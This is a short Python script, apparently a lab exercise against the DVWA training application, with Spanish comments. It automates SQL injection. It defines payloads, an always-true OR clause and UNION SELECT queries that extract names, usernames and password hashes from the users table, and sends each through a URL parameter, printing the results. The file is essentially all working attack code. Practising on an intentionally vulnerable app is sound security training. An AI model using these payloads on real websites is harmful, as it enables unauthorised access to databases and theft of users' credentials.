from utils import SLQ_INJECTION_URL, generar_session, obtener_respuesta_dvwa
from requests import Session
import urllib

SLQ_INJECTION_FORM_WITH_PARAMS = f"{SLQ_INJECTION_URL}?id={{query}}&Submit=Submit"

# Consultas de SQL INJECTION
SQL_OBTENER_TODOS_LOS_USUARIOS = "' OR '1' = '1"
SQL_OBTENER_TODOS_LOS_NOMBRES = "' UNION SELECT first_name, last_name FROM users; -- "
SQL_OBTENER_CONTRASEÑAS_HASHEADAS = "' UNION SELECT first_name, password FROM users; -- "
SQL_OBTENER_TODOS_LOS_USERNAME = "' UNION SELECT user, user_id FROM users; -- "

def crear_query_url(query: str):
    """
    Pasado un query en SQL, lo formatea y lo mete en la url para realizar las requests
    """
    formated_query = SLQ_INJECTION_FORM_WITH_PARAMS.format(query=urllib.parse.quote(query, safe=":/&=?-"))
    return formated_query

def obtener_data_users(session: Session):
    """
    Realiza varias consultas SQL maliciosas he imprime los resultados
    """
    consultas = [
        SQL_OBTENER_CONTRASEÑAS_HASHEADAS,
        SQL_OBTENER_TODOS_LOS_NOMBRES,
        SQL_OBTENER_TODOS_LOS_USERNAME,
        SQL_OBTENER_TODOS_LOS_USUARIOS
    ]
    
    # por cada consulta existente
    for (i, consulta) in enumerate(consultas):
        # creo la url para la consulta
        url = crear_query_url(consulta)
        #obtengo la respuesta del servidor
        respuesta_server = obtener_respuesta_dvwa(session.get(url))
        # imprimo
        print(f"Consulta {i+1}:({consulta})")
        if (respuesta_server is None):
            print("Error en la consulta")
            continue
        resultado = '\t'+ respuesta_server.replace('\n', '\n\t')
        print(resultado)
        print("#"*100)
        
    

session = generar_session()
#query_url = SLQ_INJECTION_FORM_WITH_PARAMS.format(query="1")
#res = session.get(query_url)
#print(obtener_respuesta_dvwa(res))

obtener_data_users(session)